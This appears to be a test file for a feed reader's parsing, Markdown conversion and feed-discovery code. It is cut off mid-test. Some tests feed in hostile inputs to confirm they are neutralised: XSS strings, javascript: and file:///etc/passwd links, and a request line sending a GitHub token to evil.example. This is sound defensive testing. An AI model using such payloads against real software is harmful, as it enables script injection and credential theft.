import { afterAll, beforeAll, describe, expect, test } from "bun:test";
import { readFileSync } from "node:fs";
import type { Route } from "playwright";
import { type App, engine, noErrors, openApp } from "./app";
import { answerPictures } from "./files";

/*
 * Feeds as lines reads them, in the browser's own XML and HTML parsers: trimmed copies of real
 * feeds (feeds/), mended ones, their HTML as Markdown, and finding a feed from a site or Apple
 * Podcasts. Nothing here reaches the network: every request is answered by the test.
 */

const fixture = (name: string) => readFileSync(new URL(`./feeds/${name}`, import.meta.url), "utf8");

let app: App;
beforeAll(async () => {
  app = await openApp();
});
afterAll(async () => {
  noErrors(app);
  await app.close();
});

const read = (text: string, url: string) => app.page.evaluate(([text, url]) => window.testing.reading.readFeed(text, url), [text, url] as const);
const markdown = (html: string, base?: string) => app.page.evaluate(([html, base]) => window.testing.reading.htmlToMarkdown(html, base), [html, base] as const);
const iso = (time?: number) => (time === undefined ? undefined : new Date(time).toISOString());

describe("reading feeds", () => {
  test("RSS 2.0: a blog's posts, their HTML, authors and dates", async () => {
    const feed = await read(fixture("blog.rss"), "https://svelte.dev/blog/rss.xml");
    expect([feed.title, feed.link, feed.description, feed.image]).toEqual([
      "Svelte blog",
      "https://svelte.dev/blog",
      "News and information about the magical disappearing UI framework",
      "https://svelte.dev/favicon.png",
    ]);
    const [first, second] = feed.posts;
    expect([first.id, first.title, first.link, first.author, iso(first.date)]).toEqual([
      "https://svelte.dev/blog/whats-new-in-svelte-october-2026",
      "What’s new in Svelte: October 2026",
      "https://svelte.dev/blog/whats-new-in-svelte-october-2026",
      "Dani Sandoval",
      "2026-10-31T00:00:00.000Z",
    ]);
    expect(first.excerpt).toStartWith("SvelteKit 3 is here! Check out the announcement post for the highlights");
    expect(await markdown(first.html, first.base)).toBe(
      [
        "SvelteKit 3 is here! Check out the [announcement post](https://svelte.dev/blog/sveltekit-3-is-here) for the highlights, then run [`sv migrate`](https://svelte.dev/docs/cli/sv-migrate) to handle most of the upgrade for you.",
        "## What’s new in SvelteKit 3",
        "- Adapters now receive the Svelte config as a function argument (**3.0.0-next.27**, [\\#16986](https://github.com/sveltejs/kit/pull/16986))\n- Adapters can override `getRequest` during `vite dev`",
      ].join("\n\n"),
    );
    expect(await markdown(second.html, second.base)).toBe("Today we’re releasing SvelteKit 3. *Upgrading* takes one command:\n\n```\nnpx sv migrate sveltekit-3\n```");
    expect(feed.posts.some((post) => post.audio)).toBe(false);
  });

  test("Atom: entries' links, xml:base, and text, HTML and XHTML content", async () => {
    const feed = await read(fixture("blog.atom"), "https://daringfireball.net/feeds/main");
    expect([feed.title, feed.link, feed.description]).toEqual(["Daring Fireball", "https://daringfireball.net/", "By John Gruber"]);
    const [first, second] = feed.posts;
    expect([first.id, first.link, first.author, iso(first.date)]).toEqual([
      "tag:daringfireball.net,2026:/linked//6.43724",
      "https://techcrunch.com/2026/11/12/jensen-huang-agrees-to-testify-before-congress/",
      "John Gruber",
      "2026-11-12T21:32:07.000Z",
    ]);
    const text = await markdown(first.html, first.base);
    expect(text).toContain("> Ex-Nvidia CEO Jensen Huang has agreed to testify before Congress, House Foreign Affairs");
    // Relative to the content's xml:base.
    expect(text).toEndWith("Closed-door is pantomime. [Public reckonings will come next year](https://daringfireball.net/linked/2026/11/11/huang).");
    // A title written as HTML reads as text; the date it was updated stands in for one it was published.
    expect([second.title, iso(second.date), second.excerpt]).toEqual(["Apple’s Year in Review", "2026-11-10T18:00:00.000Z", "A look back at the year, in brief & with feeling."]);
    expect(await markdown(second.html, second.base)).toBe("It was a **good** year.");
  });

  test("a podcast: artwork, episodes' sound, durations, seasons and numbers", async () => {
    const feed = await read(fixture("podcast.rss"), "https://feeds.megaphone.fm/FSI1483080183");
    expect([feed.title, feed.author, feed.image]).toEqual([
      "Syntax - Tasty Web Development Treats",
      "Wes Bos & Scott Tolinski - Full Stack JavaScript Web Developers",
      "https://megaphone.imgix.net/podcasts/5197fe5a/image/artwork.png?ixlib=rails-4.3.1&max-w=3000",
    ]);
    const [first, second] = feed.posts;
    expect(first).toMatchObject({
      id: "14678690-dd33-11f1-b943-2b9148b63cb2",
      link: "https://syntax.fm/1055",
      author: "Wes Bos & Scott Tolinski",
      image: "https://megaphone.imgix.net/podcasts/14678690/image/episode.png",
      audio: { url: "https://traffic.megaphone.fm/FSI3647670844.mp3", type: "audio/mpeg" },
      duration: 1882,
      season: 9,
      episode: 1055,
    });
    // The show notes, from content:encoded; the excerpt from the plain description.
    expect(await markdown(first.html, first.base)).toContain("- **[00:00](https://syntax.fm/1055#t=00:00)** Welcome to Syntax!");
    expect(first.excerpt).toBe("Scott and Wes sit down with GitHub’s Kyle Daigle to ask what the hell is going on with GitHub. Show Notes 00:00 Welcome to Syntax!");
    // No link, and its guid isn't one; Podcasting 2.0's season and episode.
    expect(second).toMatchObject({ id: "a2b9c0f2-dd33-11f1", duration: 2710, season: 9, episode: 1054 });
    expect(second.link).toBeUndefined();
  });

  test("RSS 1.0 (RDF): items beside the channel, their ids, Dublin Core's authors and dates", async () => {
    const feed = await read(fixture("slashdot.rdf"), "https://rss.slashdot.org/Slashdot/slashdotMain");
    expect([feed.title, feed.link, feed.author, feed.image]).toEqual(["Slashdot", "https://slashdot.org/", undefined, "https://a.fsdn.com/sd/topics/topicslashdot.gif"]);
    const [first, second] = feed.posts;
    expect([first.id, first.author, iso(first.date)]).toEqual([
      "https://tech.slashdot.org/story/26/11/13/0135237/whoop-launches-a-social-network?utm_source=rss1.0mainlinkanon&utm_medium=feed",
      "BeauHD",
      "2026-11-13T01:40:00.000Z",
    ]);
    // The embedded discussion is a link; the tracking pixel goes.
    expect(await markdown(first.html, first.base)).toBe(
      [
        "Whoop has launched Humans, a social network built into its fitness app.",
        "[Read more of this story](https://tech.slashdot.org/story/26/11/13/0135237/?utm_source=rss1.0moreanon&utm_medium=feed) at Slashdot.",
        "[slashdot.org](https://slashdot.org/slashdot-it.pl?op=discuss&id=24150406&smallembed=1)",
      ].join("\n\n"),
    );
    expect(second.excerpt).toBe("Astronomers re-analyzed the data — and the ring is still there.");
  });

  test("JSON Feed: its items' HTML or text, authors (1.1's and 1.0's), dates, pictures and sound, and fields of the wrong kind passed over", async () => {
    const feed = await read(fixture("blog.json"), "https://linked.example/feed.json");
    expect([feed.format, feed.title, feed.link, feed.description, feed.author, feed.image]).toEqual([
      "json",
      "Linked & Loaded",
      "https://linked.example/",
      "Links, and what I make of them",
      "Ada Lovelace",
      "https://linked.example/icon-512.png",
    ]);
    // The same id twice is one post, and what isn't an item isn't one.
    expect(feed.posts).toHaveLength(5);
    const [first, untitled, episode, linked, odd] = feed.posts;
    expect([first.id, first.title, first.link, first.author, iso(first.date), first.image, first.excerpt]).toEqual([
      "https://linked.example/2026/11/engines",
      "On engines",
      "https://linked.example/2026/11/engines",
      "Ada Lovelace",
      "2026-11-13T14:30:00.000Z",
      "https://linked.example/img/engine.png",
      "Why the engine matters.",
    ]);
    expect(await markdown(first.html, first.base)).toBe("Read [my notes](https://linked.example/2026/10/notes) first.");
    // Text is only ever text: its tags and entities are what it says, not markup.
    expect([untitled.id, untitled.author, iso(untitled.date), untitled.link, untitled.base]).toEqual(["42", "Charles Babbage", "2026-11-12T08:00:00.000Z", undefined, "https://linked.example/"]);
    expect(untitled.title).toStartWith("No title, plain text with <b>angle brackets</b> & an &amp; written out.");
    const text = await markdown(untitled.html, untitled.base);
    expect(text).toEndWith("\n\nA second paragraph.");
    expect(text).not.toContain("**");
    expect(episode).toMatchObject({ id: "ep-7", title: "Episode 7", audio: { url: "https://cdn.linked.example/7.mp3", type: "audio/mpeg" }, duration: 1835 });
    expect([odd.title, odd.link]).toEqual(["Fields of the wrong kind", undefined]);
    // A title is plain text; a link post links elsewhere, but its own links are its site's.
    expect([linked.title, linked.link]).toEqual(["Why </script> breaks inline <b>JSON</b> & AT&amp;T", "https://other.example/story"]);
    expect(await markdown(linked.html, linked.base)).toBe("See [about](https://linked.example/about).");
  });

  test("a broken feed is mended: whitespace first, bare &s, HTML's entities, a prefix never declared", async () => {
    const feed = await read(fixture("broken.rss"), "https://tomandjerry.example/feed");
    expect([feed.title, feed.link, feed.description, feed.image]).toEqual([
      "Tom & Jerry’s Blog",
      "https://tomandjerry.example/?a=1&b=2",
      "Cartoons and chases",
      "https://tomandjerry.example/art.png",
    ]);
    const [first, second] = feed.posts;
    expect([first.title, first.link, iso(first.date), first.duration, first.html]).toEqual([
      "Cheese — a history",
      "https://tomandjerry.example/cheese?ref=feed&utm=1",
      "2026-11-10T13:00:00.000Z",
      750,
      "<p>Holes & all. <b>Swiss</b> first.</p>",
    ]);
    expect(second.title).toBe("Mousetraps © 2026");
    // Plain text keeps its lines and paragraphs.
    expect(await markdown(second.html, second.base)).toBe("Plain text,\ntwo lines.\n\nAnd a second paragraph &unknownentity; here.");
  });

  test("characters XML doesn't allow are left out, and a feed cut short keeps what came before", async () => {
    const control = await read(`<rss><channel><title>Bell\u0007s</title><item><title>One\u000b</title><guid>1</guid></item></channel></rss>`, "https://example.com/feed");
    expect([control.title, control.posts.map((post) => post.title)]).toEqual(["Bells", ["One"]]);
    const cut = await read(`<rss><channel><title>Cut</title><item><title>One</title><guid>1</guid></item><item><title>Two</title><guid>2</guid></item><item><title>Thr`, "https://example.com/feed");
    expect(cut.posts.map((post) => post.title).slice(0, 2)).toEqual(["One", "Two"]);
  });

  test("where a post is talked about: RSS's <comments>, Atom's replies page (not its comments' feed)", async () => {
    const rss = await read(
      `<rss version="2.0"><channel><title>News</title><link>https://news.example/</link><item><title>A</title><link>https://a.example/post</link><comments>https://news.example/item?id=1</comments></item><item><title>B</title><link>https://b.example/</link></item></channel></rss>`,
      "https://news.example/rss",
    );
    expect(rss.posts.map((post) => post.comments)).toEqual(["https://news.example/item?id=1", undefined]);
    // One that says only "Comments", a link to them, has no excerpt to show in the list.
    const news = await read(
      `<rss version="2.0"><channel><title>News</title><item><title>A</title><link>https://a.example/post</link><comments>https://news.example/item?id=1</comments><description><![CDATA[<a href="https://news.example/item?id=1">Comments</a>]]></description></item><item><title>B</title><link>https://b.example/</link><description>What B is about.</description></item></channel></rss>`,
      "https://news.example/rss",
    );
    expect(news.posts.map((post) => post.excerpt)).toEqual(["", "What B is about."]);
    const atom = await read(
      `<feed xmlns="http://www.w3.org/2005/Atom"><title>Blog</title><entry><title>A</title><id>a</id><link href="/a"/><link rel="replies" type="application/atom+xml" href="/a/comments.xml"/><link rel="replies" type="text/html" href="/a#comments"/></entry><entry><title>B</title><id>b</id><link rel="replies" type="application/atom+xml" href="/b/comments.xml"/></entry></feed>`,
      "https://blog.example/feed",
    );
    expect(atom.posts.map((post) => post.comments)).toEqual(["https://blog.example/a#comments", undefined]);
  });

  test("posts with no guid (or JSON Feed id) that share a link (an aggregator's) are told apart by their titles; one alone keeps its link", async () => {
    const feed = await read(
      `<rss version="2.0"><channel><title>Links</title><item><title>First take</title><link>https://a.example/story</link></item><item><title>Second take</title><link>https://a.example/story</link></item><item><title>Other</title><link>https://b.example/</link></item><item><title>Again</title><guid>g</guid><link>https://a.example/story</link></item></channel></rss>`,
      "https://links.example/rss",
    );
    expect(feed.posts.map((post) => [post.id, post.title])).toEqual([
      ["https://a.example/story\nFirst take", "First take"],
      ["https://a.example/story\nSecond take", "Second take"],
      ["https://b.example/", "Other"],
      ["g", "Again"],
    ]);
    // A JSON Feed's items with no id alike, a link post by its external_url.
    const items = [
      { title: "First take", url: "https://a.example/story", content_text: "a" },
      { title: "Second take", external_url: "https://a.example/story", content_text: "b" },
      { title: "Other", url: "https://b.example/", content_text: "c" },
      { id: 7, title: "Again", url: "https://a.example/story", content_text: "d" },
    ];
    const json = await read(JSON.stringify({ version: "https://jsonfeed.org/version/1.1", title: "Links", items }), "https://links.example/feed.json");
    expect(json.posts.map((post) => post.id)).toEqual(["https://a.example/story\nFirst take", "https://a.example/story\nSecond take", "https://b.example/", "7"]);
  });

  test("a page isn't a feed", async () => {
    const refused = await app.page.evaluate(() => {
      try {
        window.testing.reading.readFeed("<!doctype html><html><body>Hi</body></html>", "https://example.com/");
        return false;
      } catch (error) {
        return error instanceof window.testing.reading.NotAFeed;
      }
    });
    expect(refused).toBe(true);
  });

  test("a podcast's episode: its transcript, in the format lines reads best of those it names, and its chapters", async () => {
    const [episode, other] = (await read(fixture("podcast.rss"), "https://feeds.megaphone.fm/FSI1483080183")).posts;
    // Of WebVTT and plain text, WebVTT: it has times.
    expect(episode.transcript).toEqual({ url: "https://syntax.fm/1055/transcript.vtt", type: "text/vtt" });
    expect(episode.chapters).toEqual({ url: "https://syntax.fm/1055/chapters.json", type: "application/json+chapters" });
    expect([other.transcript, other.chapters]).toEqual([undefined, undefined]);
  });
});

describe("transcripts", () => {
  /** What's said, as `0:04 Speaker: text`, read as lines does (plugins/feeds/transcripts.ts). */
  const said = (text: string, type?: string) =>
    app.page.evaluate(
      ([text, type]) =>
        window.testing.reading.sentences(window.testing.reading.readTranscript(text, type)).map(({ start, speaker, text }) => `${Math.floor(start)} ${speaker ?? "?"}: ${text}`),
      [text, type] as const,
    );

  test("Podcasting 2.0's HTML, however a host writes it, as text only", async () => {
    // Buzzsprout's: a chapter's heading, every word in a span, no colon after a name.
    expect(await said(fixture("transcript-buzzsprout.html"), "text/html")).toEqual(["0 Ada Moss: Coming up, turtles' way home.", "4 Announcer: With Ada & Ben.", "3723 Announcer: Still Ada, a long way in."]);
    // Captivate's: an empty paragraph after each; with no type, read as what it looks like.
    expect(await said(fixture("transcript-captivate.html"))).toEqual([
      "0 Ben: Ada, I can't do a podcast with you. We're done.",
      "8 Ben: What is going on there?",
      "10 Ada: Oh, it's the window. Sorry about the gulls.",
    ]);
    // Markup and references in what's said are read as the page's text, never run or shown.
    expect(await said('<cite>Ada:</cite><time>0:01</time><p>a &lt; b, &#99999999; <img src=x onerror="window.ran=1"> &amp; c</p>')).toEqual(["1 Ada: a < b, � & c"]);
    expect(await app.page.evaluate(() => "ran" in window)).toBe(false);
  });

  test("JSON's text, its markup and references read", async () => {
    const json = JSON.stringify({ segments: [{ speaker: "Ada", startTime: "1.5", body: "<b>Tides</b> &amp; turtles &#99999999;" }] });
    expect(await said(json)).toEqual(["1 Ada: Tides & turtles �"]);
  });
});

describe("HTML as Markdown", () => {
  test("keeps what lines draws, escapes what it would read as its own, and drops the rest", async () => {
    const html = `
      <h1>Title</h1>
      <p>A #tag, @someone, $x$, ==this==, *stars*, [brackets] and a_snake_case word, at <b>no</b> cost: $5.</p>
      <p># Not a heading<br>- not a list<br>1. nor this</p>
      <ul><li>One<ul><li>Nested</li></ul></li><li>Two</li></ul>
      <ol start="3"><li>Third</li><li>Fourth</li></ol>
      <blockquote><p>Quoted</p><p>twice</p></blockquote>
      <table><tr><th>Name</th><th>Size</th></tr><tr><td>a|b</td><td>2</td></tr></table>
      <p><img src="/cat.png" alt="A cat"><img src="data:image/png;base64,AAAA"><img src="https://track.example/p.gif" width="1" height="1"></p>
      <p><a href="javascript:alert(1)">Not a link</a> <a href="mailto:a@b.example">Mail</a> <a href="page two.html">Spaced</a></p>
      <script>alert(1)</script><style>p{}</style><!-- a comment -->
      <p>Some <code>code with \`ticks\`</code> and <del>gone</del> <em> spaced </em>.</p>`;
    expect(await markdown(html, "https://example.com/post/")).toBe(
      [
        "## Title",
        "A \\#tag, \\@someone, \\$x\\$, \\=\\=this\\=\\=, \\*stars\\*, \\[brackets] and a_snake_case word, at **no** cost: \\$5.",
        "\\# Not a heading\n\\- not a list\n1\\. nor this",
        "- One\n  - Nested\n- Two",
        "3. Third\n4. Fourth",
        "> Quoted\n>\n> twice",
        "| Name | Size |\n| --- | --- |\n| a\\|b | 2 |",
        "![A cat](https://example.com/cat.png)",
        "Not a link [Mail](mailto:a@b.example) [Spaced](https://example.com/post/page%20two.html)",
        "Some `` code with `ticks` `` and ~~gone~~ *spaced* .",
      ].join("\n\n"),
    );
  });

  test("a post that says nothing but links to itself or its comments says nothing of its own", async () => {
    const saysMore = (html: string, own: string[]) => app.page.evaluate(([html, own]) => window.testing.reading.saysMore(html, "https://news.example/", own), [html, own] as const);
    const own = ["https://a.example/post", "https://news.example/item?id=1"];
    expect(await saysMore(`<a href="https://news.example/item?id=1">Comments</a>`, own)).toBe(false);
    expect(await saysMore(`<p><a href="item?id=1">Comments</a> <a href="https://a.example/post">Link</a></p>`, own)).toBe(false);
    expect(await saysMore("", own)).toBe(false);
    expect(await saysMore(`<p>What it found.</p><a href="https://news.example/item?id=1">Comments</a>`, own)).toBe(true);
    expect(await saysMore(`<a href="https://elsewhere.example/">Elsewhere</a>`, own)).toBe(true);
    expect(await saysMore(`<img src="chart.png">`, own)).toBe(true);
  });

  test("a block within a line stays in it: code as code, anything else as its words", async () => {
    const html = `
      <div>Read this<i><pre>[Open](file:///System/Applications/Calculator.app)\n@[Secret] #tag $x$ [[New note]]</pre></i> now.</div>
      <div>x <a><pre>[click](file:///etc/passwd)</pre></a> y <b><pre>---\n# Heading</pre></b></div>
      <div>Intro <span><h2>## Two</h2><ul><li>- item</li></ul><blockquote>&gt; quote</blockquote></span> end</div>`;
    expect(await markdown(html)).toBe(
      [
        "Read this *`[Open](file:///System/Applications/Calculator.app) @[Secret] #tag $x$ [[New note]]`* now.",
        "x `[click](file:///etc/passwd)` y **`--- # Heading`**",
        "Intro \\## Two \\- item \\> quote end",
      ].join("\n\n"),
    );
  });

  test("code is shown without its language, so nothing draws or runs it", async () => {
    const html = `<pre class="language-http">GET https://evil.example/collect?k={{github}}</pre><pre><code class="language-mermaid">graph TD; A--&gt;B</code></pre><pre>\`\`\`js\nnested\n\`\`\`</pre>`;
    expect(await markdown(html)).toBe(["```\nGET https://evil.example/collect?k={{github}}\n```", "```\ngraph TD; A-->B\n```", "````\n```js\nnested\n```\n````"].join("\n\n"));
  });
});

describe("subscribing", () => {
  const subscribe = (input: string) =>
    app.page.evaluate(async (input) => {
      const { feeds, reading, notes } = window.testing;
      try {
        const url = await feeds.subscribe(input);
        const subscription = feeds.subscription(url)!;
        return { url, title: subscription.title, note: notes.get(subscription.note)!.note.body.split("\n# ")[0] };
      } catch (error) {
        return { error: error instanceof reading.NoFeed ? "no feed" : (error as Error).message };
      }
    }, input);
  /** Answers requests for `href` as a site that lets web pages read it. */
  const answer = (href: string, body: string, type: string) =>
    app.page.route(
      (url) => url.href === href,
      (route: Route) => route.fulfill({ body, contentType: type, headers: { "access-control-allow-origin": "*" } }),
    );

  test("to the feed's link, a site's, or a podcast's on Apple Podcasts: a note of the feed's, made as the Library makes one", async () => {
    await answerPictures(app.page);
    await answer("https://site.example/", `<!doctype html><head><link rel="alternate" type="application/atom+xml" href="/atom.xml"><link rel="alternate" type="application/rss+xml" href="feed.xml"></head>`, "text/html");
    await answer("https://site.example/feed.xml", fixture("blog.rss"), "application/rss+xml");
    await app.page.route(
      (url) => url.href.startsWith("https://itunes.apple.com/lookup?id=1253186678"),
      (route) => route.fulfill({ json: { resultCount: 1, results: [{ kind: "podcast", collectionName: "Syntax", artistName: "Wes Bos", feedUrl: "https://feeds.megaphone.fm/FSI1483080183" }] }, headers: { "access-control-allow-origin": "*" } }),
    );
    await answer("https://feeds.megaphone.fm/FSI1483080183", fixture("podcast.rss"), "application/xml");
    const blog = await subscribe("https://site.example/feed.xml");
    expect([blog.url, blog.title]).toEqual(["https://site.example/feed.xml", "Svelte blog"]);
    // Its artwork kept as an attachment, as the Library keeps covers.
    expect(blog.note).toMatch(/^---\ntype: feed\nfeed: https:\/\/site\.example\/feed\.xml\nlink: https:\/\/svelte\.dev\/blog\n---$/);
    // RSS first, of the feeds the page names; one already subscribed to isn't again.
    expect(await subscribe("site.example")).toEqual(blog);
    const podcast = await subscribe("https://podcasts.apple.com/us/podcast/syntax-tasty-web-development-treats/id1253186678");
    expect([podcast.url, podcast.title]).toEqual(["https://feeds.megaphone.fm/FSI1483080183", "Syntax - Tasty Web Development Treats"]);
    expect(podcast.note).toContain("type: podcast\nauthor: Wes Bos & Scott Tolinski - Full Stack JavaScript Web Developers\nfeed: https://feeds.megaphone.fm/FSI1483080183");
    const bodies = await app.page.evaluate(() => window.testing.notes.entries.map(({ note }) => note.body));
    // (WebKit here can't store pictures, so has none, rather than one shown from the site.)
    if (engine() === "chromium") expect(bodies.filter((body) => /!\[[^\]]*\]\(\.\.\/attachments\/[0-9a-f]{32}\.\w+\)/.test(body))).toHaveLength(2);
  });

  test("to a JSON Feed a site's page names, by 1.1's type or 1.0's, but not the site's API", async () => {
    const asked: string[] = [];
    const json = (title: string) => JSON.stringify({ version: "https://jsonfeed.org/version/1", title, home_page_url: "https://json.example/", items: [{ id: "1", url: "https://json.example/1", content_text: "Hello" }] });
    await app.page.route(
      (url) => url.hostname === "json.example" && url.pathname.startsWith("/wp-json"),
      (route) => {
        asked.push(route.request().url());
        return route.fulfill({ json: { id: 2 }, headers: { "access-control-allow-origin": "*" } });
      },
    );
    await answer("https://json.example/", `<!doctype html><head><link rel="alternate" type="application/json" href="/wp-json/wp/v2/pages/2"><link rel="alternate" type="application/feed+json" href="/feed.json"></head>`, "text/html");
    await answer("https://json.example/feed.json", json("JSON Blog"), "application/feed+json");
    await answer("https://older.example/", `<!doctype html><head><link rel="alternate" type="application/json" title="JSON Feed" href="https://older.example/feeds/json-feed"></head>`, "text/html");
    await answer("https://older.example/feeds/json-feed", json("Older JSON Blog"), "application/json");
    const blog = await subscribe("json.example");
    expect([blog.url, blog.title]).toEqual(["https://json.example/feed.json", "JSON Blog"]);
    expect(blog.note).toContain("type: feed\nfeed: https://json.example/feed.json");
    expect(asked).toEqual([]);
    expect(await app.page.evaluate(() => window.testing.feeds.groupOf.get("https://json.example/feed.json"))).toBe("json");
    const older = await subscribe("https://older.example/");
    expect([older.url, older.title]).toEqual(["https://older.example/feeds/json-feed", "Older JSON Blog"]);
  });

  test("a site's page that names no feed: where sites usually keep theirs, beside the page first, one request at a time, giving up on a site that asks to be left alone", async () => {
    const asked: string[] = [];
    /** Every request to `host` noted, and answered 404 unless answered otherwise below (routes added later are asked first). */
    const site = (host: string) =>
      app.page.route(
        (url) => url.hostname === host,
        (route) => {
          asked.push(route.request().url());
          return route.fulfill({ status: 404, body: "", headers: { "access-control-allow-origin": "*" } });
        },
      );
    await site("quiet.example");
    await site("busy.example");
    await answer("https://quiet.example/blog", "<!doctype html><title>Blog</title>", "text/html");
    await answer("https://quiet.example/blog/rss.xml", fixture("blog.atom"), "application/atom+xml");
    await answer("https://busy.example/news", "<!doctype html><title>News</title>", "text/html");
    await app.page.route("https://busy.example/news/rss", (route) => {
      asked.push(route.request().url());
      return route.fulfill({ status: 429, body: "", headers: { "access-control-allow-origin": "*", "retry-after": "60" } });
    });

    const blog = await subscribe("quiet.example/blog");
    expect(blog.url).toBe("https://quiet.example/blog/rss.xml");
    expect(asked).toEqual(["https://quiet.example/blog/feed", "https://quiet.example/blog/rss"]);
    asked.length = 0;
    expect(await subscribe("https://busy.example/news")).toEqual({ error: "no feed" });
    expect(asked).toEqual(["https://busy.example/news/feed", "https://busy.example/news/rss"]);
    app.errors.length = 0;
  });

  test("to someone on SoundCloud whose sounds are a podcast: SoundCloud's feed of them; someone's whose feed has nothing in it, nothing", async () => {
    const FEED = "https://feeds.soundcloud.com/users/soundcloud:users:20789805/sounds.rss";
    const cors = { "access-control-allow-origin": "*" };
    // Anything else of SoundCloud's isn't there.
    await app.page.route((url) => url.hostname.endsWith("soundcloud.com"), (route) => route.fulfill({ status: 404, body: "", headers: cors }));
    await app.page.route(
      (url) => url.href.startsWith("https://soundcloud.com/oembed"),
      (route) => {
        const [name, id] = new URL(route.request().url()).searchParams.get("url")!.endsWith("/bader_b") ? ["BaderB", "20789805"] : ["Forss", "183"];
        const html = `<iframe src="https://w.soundcloud.com/player/?visual=true&url=https%3A%2F%2Fapi.soundcloud.com%2Fusers%2F${id}&show_artwork=true"></iframe>`;
        return route.fulfill({ json: { title: name, author_name: name, html }, headers: cors });
      },
    );
    // Someone's page names no feed.
    await answer("https://soundcloud.com/forss", "<!doctype html><title>Forss</title>", "text/html");
    await answer(FEED, fixture("soundcloud.rss"), "application/rss+xml");
    await answer("https://feeds.soundcloud.com/users/soundcloud:users:183/sounds.rss", fixture("soundcloud.rss").replace(/<item>[\s\S]*<\/item>/, ""), "application/rss+xml");
    const podcast = await subscribe("https://soundcloud.com/bader_b");
    expect([podcast.url, podcast.title]).toEqual([FEED, "Melodic Techno Mix"]);
    expect(podcast.note).toContain(`type: podcast\nauthor: BaderB\nfeed: ${FEED}`);
    expect(await subscribe("https://soundcloud.com/forss")).toEqual({ error: "no feed" });
    app.errors.length = 0;
  });

  test("a podcast's site, whose own feed is for its posts: the podcast it links to, by its feed or its page on Apple Podcasts, but not one it only mentions", async () => {
    for (const host of ["www.syntax.fm", "syntax.fm", "mentions.example", "feeds.host.example"])
      await app.page.route((url) => url.hostname === host, (route) => route.fulfill({ status: 404, body: "", headers: { "access-control-allow-origin": "*" } }));
    await app.page.route(
      (url) => url.href.startsWith("https://itunes.apple.com/lookup?id=1253186678"),
      (route) => route.fulfill({ json: { resultCount: 1, results: [{ kind: "podcast", collectionName: "Syntax", feedUrl: "https://feeds.megaphone.fm/FSI1483080183" }] }, headers: { "access-control-allow-origin": "*" } }),
    );
    await answer("https://feeds.megaphone.fm/FSI1483080183", fixture("podcast.rss"), "application/xml");
    // The podcast's feed says its site is https://syntax.fm.
    await answer("https://feeds.host.example/syntax.rss", fixture("podcast.rss"), "application/xml");
    const page = (feed: string, link: string) => `<!doctype html><head><link rel="alternate" type="application/atom+xml" href="${feed}"></head><body><a href="${link}">Listen</a></body>`;
    await answer("https://www.syntax.fm/", page("/posts.atom", "https://feeds.host.example/syntax.rss"), "text/html");
    await answer("https://www.syntax.fm/posts.atom", fixture("blog.atom"), "application/atom+xml");
    await answer("https://syntax.fm/listen", `<!doctype html><a href="https://example.com/">Elsewhere</a> <a href="https://podcasts.apple.com/us/podcast/syntax/id1253186678">Apple Podcasts</a>`, "text/html");
    await answer("https://mentions.example/", page("/feed.xml", "https://feeds.host.example/syntax.rss"), "text/html");
    await answer("https://mentions.example/feed.xml", fixture("blog.rss"), "application/rss+xml");

    expect((await subscribe("https://www.syntax.fm/")).url).toBe("https://feeds.host.example/syntax.rss");
    expect((await subscribe("https://syntax.fm/listen")).url).toBe("https://feeds.megaphone.fm/FSI1483080183");
    // A blog that links to someone else's podcast is subscribed to for its own posts.
    expect((await subscribe("https://mentions.example/")).url).toBe("https://mentions.example/feed.xml");
    app.errors.length = 0;
  });

  test("says when there's none, and when the site doesn't let web pages read it", async () => {
    // Where sites usually keep a feed isn't there either.
    await app.page.route((url) => url.hostname === "nofeed.example", (route) => route.fulfill({ status: 404, body: "", headers: { "access-control-allow-origin": "*" } }));
    await answer("https://nofeed.example/", "<!doctype html><title>Nothing</title>", "text/html");
    // A page sees a site that doesn't let it read it as one it couldn't reach (Playwright lets every answer of its own through).
    await app.page.route("https://closed.example/feed", (route) => route.abort("failed"));
    expect(await subscribe("https://nofeed.example/")).toEqual({ error: "no feed" });
    expect(await subscribe("not a link at all")).toEqual({ error: "no feed" });
    expect(await subscribe("https://closed.example/feed")).toEqual({ error: "blocked" });
    // Which the browser says in the console.
    app.errors.length = 0;
  });
});

test("reads the feeds an OPML file lists, in folders or not", async () => {
  const opml = `<?xml version="1.0"?><opml version="1.0"><head><title>Feeds</title></head><body>
    <outline text="Blogs"><outline type="rss" text="Svelte" xmlUrl="https://svelte.dev/blog/rss.xml" htmlUrl="https://svelte.dev/blog"/></outline>
    <outline type="rss" title="Syntax" text="ignored" xmlUrl="https://feeds.megaphone.fm/FSI1483080183"/>
    <outline type="rss" text="Again" xmlUrl="https://svelte.dev/blog/rss.xml"/>
    <outline type="link" text="Not a feed" url="https://example.com/"/>
  </body></opml>`;
  expect(await app.page.evaluate((opml) => window.testing.reading.readOpml(opml), opml)).toEqual([
    { url: "https://svelte.dev/blog/rss.xml", title: "Svelte", site: "https://svelte.dev/blog" },
    { url: "https://feeds.megaphone.fm/FSI1483080183", title: "Syntax" },
  ]);
});

describe("discussions", () => {
  const text = (html: string, base?: string) => app.page.evaluate(([html, base]) => window.testing.discussions.htmlToText(html, base), [html, base] as const);

  test("a comment's HTML as paragraphs, quotes, lists and code, its entities read and its links only to the web", async () => {
    // As Hacker News writes them: the first paragraph bare, the others after a <p>, code in <pre><code>.
    expect(
      await text(
        'I use icewm <i>today</i> &amp; it&#x27;s fine.<p>See <a href="https:&#x2F;&#x2F;example.com&#x2F;a" rel="nofollow">https:&#x2F;&#x2F;example.com&#x2F;a</a> or <a href="item?id=1">this</a>.<p><pre><code>  let x = 1;\n  x += 1;\n</code></pre>',
        "https://news.ycombinator.com/",
      ),
    ).toEqual([
      { kind: "paragraph", spans: [{ text: "I use icewm " }, { text: "today", emphasis: true }, { text: " & it's fine." }] },
      { kind: "paragraph", spans: [{ text: "See " }, { text: "https://example.com/a", href: "https://example.com/a" }, { text: " or " }, { text: "this", href: "https://news.ycombinator.com/item?id=1" }, { text: "." }] },
      { kind: "code", spans: [{ text: "  let x = 1;\n  x += 1;" }] },
    ]);
    // Nothing runs or loads, and a link elsewhere than the web is only its words.
    expect(await text('Hi <img src="x" onerror="alert(1)"> <script>alert(1)</script><a href="javascript:alert(1)">click</a> <a href="data:text/html,x">me</a>')).toEqual([
      { kind: "paragraph", spans: [{ text: "Hi click me" }] },
    ]);
    // Other sites' quotes, lists (from where they start), bold and line breaks.
    expect(await text('<blockquote><p>quoted <b>bold <i>both</i></b></p></blockquote><ol start="3"><li>three</li><li>four<br>lines<ul><li>in it</li></ul></li></ol>')).toEqual([
      { kind: "quote", spans: [{ text: "quoted " }, { text: "bold ", strong: true }, { text: "both", strong: true, emphasis: true }] },
